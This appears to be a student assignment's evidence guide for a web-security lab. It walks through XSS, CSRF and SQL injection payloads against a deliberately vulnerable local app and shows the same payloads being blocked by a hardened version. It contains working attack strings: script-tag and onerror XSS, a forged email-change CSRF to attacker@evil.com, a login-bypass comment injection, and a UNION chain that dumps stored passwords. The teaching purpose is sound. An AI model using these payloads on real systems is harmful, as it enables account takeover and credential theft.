# Payload & Evidence Guide

Every payload below was **tested against a live MySQL 8 backend** while
building this project (via curl) and confirmed to behave exactly as
described. Use this as your checklist: run each payload against the
**Vulnerable** app (port 4000), screenshot the result, then run the same
payload against the **Safe** app (port 5000) and screenshot the block.

---

## 1. Cross-Site Scripting (XSS) — 25 marks

### 1a. Reflected XSS
- **Where:** Search box on the dashboard, or directly via URL
- **URL:** `http://localhost:4000/search?q=<script>alert('Reflected XSS')</script>`
- **Vulnerable result:** an alert box pops up with "Reflected XSS" — the
  payload was echoed straight into the page.
- **Safe app:** `http://localhost:5000/search?q=<script>alert('Reflected XSS')</script>`
  → no alert; the page shows the literal text
  `<script>alert('Reflected XSS')</script>` as plain, inert text.

### 1b. Stored XSS
- **Where:** any course page → "Write a review" box, e.g.
  `http://localhost:4000/courses/1`
- **Payload:** `<script>alert('Stored XSS')</script>`
- **Vulnerable result:** submit the review, then simply reload the course
  page (or have any other user open it) — the alert fires every time,
  because it's saved in the `reviews` table and rendered unescaped.
- **Safe app:** same steps on `http://localhost:5000/courses/1` — the
  review is saved and displayed as literal text, no alert ever fires
  (confirmed by `sanitize-html` stripping the `<script>` tag before it's
  even written to the database).

### 1c. DOM-based XSS
- **Where:** the dashboard URL hash (never touches the server at all)
- **URL:** `http://localhost:4000/dashboard#welcome=<img src=x onerror=alert('DOM XSS')>`
- **Vulnerable result:** the welcome banner executes the `onerror`
  handler and alerts "DOM XSS" — purely client-side, in
  `public/js/dashboard.js`, via `innerHTML`.
- **Safe app:** `http://localhost:5000/dashboard#welcome=<img src=x onerror=alert('DOM XSS')>`
  → the banner shows the literal payload text, no alert, because
  `public/js/dashboard.js` uses `textContent` instead.

---

## 2. Cross-Site Request Forgery (CSRF) — 15 marks

- **Target:** `POST /account/update-email` (a genuine state-changing
  action — it really updates the `users.email` column in MySQL)
- **Attack page:** `vulnerable/attack-demo/malicious-csrf.html`
- **Steps:**
  1. Log into `http://localhost:4000` as `saqlain` / `Student@123` and
     leave the tab open.
  2. `cd vulnerable/attack-demo && python3 -m http.server 9000`
  3. Open `http://localhost:9000/malicious-csrf.html` in the same
     browser — it auto-submits on load.
  4. Reload `http://localhost:4000/account` — email is now
     `attacker@evil.com`, with the victim never clicking "submit" or
     seeing any confirmation.
- **Verified:** I confirmed this exact flow via curl (simulating the
  browser's automatic cookie attachment) — the vulnerable app accepted the
  forged request and changed the email with **HTTP 302** (success).
- **Safe app:** point the same attack page's form `action` at
  `http://localhost:5000/account/update-email` and repeat — it is
  rejected with **HTTP 403 Forbidden** ("invalid or missing CSRF token")
  because the form never obtained the victim's real per-session token.

---

## 3. SQL Injection — 30 marks

### 3a. Easy — login bypass
- **Where:** `http://localhost:4000/login`
- **Username:** `admin' -- ` (note the trailing space after `--`)
- **Password:** anything, e.g. `whatever`
- **Vulnerable result:** logs straight in as `admin`, no valid password
  needed — the query becomes
  `SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'`,
  which comments out the password check entirely.
- **Safe app:** same credentials on `http://localhost:5000/login` →
  "Invalid username or password" — the `'` is just a literal character in
  a bound parameter, not SQL syntax.

### 3b. Intermediate — blind boolean-based
- **Where:** `http://localhost:4000/forgot-password`
- **Payload 1 (TRUE):** `admin' AND '1'='1`
  → "An account with that username exists."
- **Payload 2 (FALSE):** `admin' AND '1'='2`
  → "No account found with that username."
- This TRUE/FALSE oracle is enough to extract data character-by-character,
  e.g. to confirm the first character of the admin password:
  `admin' AND SUBSTRING(password,1,1)='A'-- ` → TRUE (the real admin
  password is `Admin@12345`).
- **Safe app:** both payloads on `http://localhost:5000/forgot-password`
  return the exact same generic message — the oracle is gone, and the
  query is parameterized anyway so the injection has no effect.

### 3c. Advanced — full UNION-based attack chain
- **Where:** `http://localhost:4000/search?q=...` (course search)

| Stage | Payload (as `q`) | What it does |
|-------|-------------------|---------------|
| 1. Column count | `x' ORDER BY 5-- -` | Errors (only 4 columns exist) — confirms the query selects 4 columns |
| 1b. Confirm | `x' ORDER BY 4-- -` | No error → 4 columns confirmed |
| 2. Union probe | `x' UNION SELECT 1,2,3,4-- -` | Shows which column positions get reflected on the page |
| 3. Table enum | `x' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -` | Lists every table in the database: `users`, `courses`, `reviews` |
| 4. Column enum | `x' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'-- -` | Lists every column in `users`: `id`, `username`, `password`, `email`, `full_name`, `role`, `created_at` |
| 5. Data dump | `x' UNION SELECT 1,CONCAT(username,0x3a,password),3,4 FROM users-- -` | Dumps every username:password pair — confirmed output: `admin:Admin@12345`, `saqlain:Student@123`, `ayesha:Student@123` |

  (Use the search box, or hit the URL directly, e.g.
  `http://localhost:4000/search?q=x'+UNION+SELECT+1,CONCAT(username,0x3a,password),3,4+FROM+users--+-`)

- **Safe app:** every payload above, run against
  `http://localhost:5000/search?q=...`, returns **zero results** — the
  entire string (quotes, `UNION`, everything) is sent to MySQL as a single
  literal parameter, so it can never become part of the SQL syntax.

---

## 4. Suggested screenshot set (for the Word document)

For each of the 8 rows below: one screenshot on port 4000 (exploit works)
and one on port 5000 (exploit blocked) = 16 screenshots total, matching
the assignment's evidence requirement:

1. Reflected XSS
2. Stored XSS
3. DOM-based XSS
4. CSRF (before/after email value, or the 403 page)
5. SQLi Easy (logged-in dashboard vs. "Invalid username or password")
6. SQLi Intermediate (both TRUE/FALSE responses vs. identical safe response)
7. SQLi Advanced — table/column enumeration (one screenshot of the
   `information_schema` results)
8. SQLi Advanced — final data dump (`username:password` pairs) vs. empty
   results on the safe app
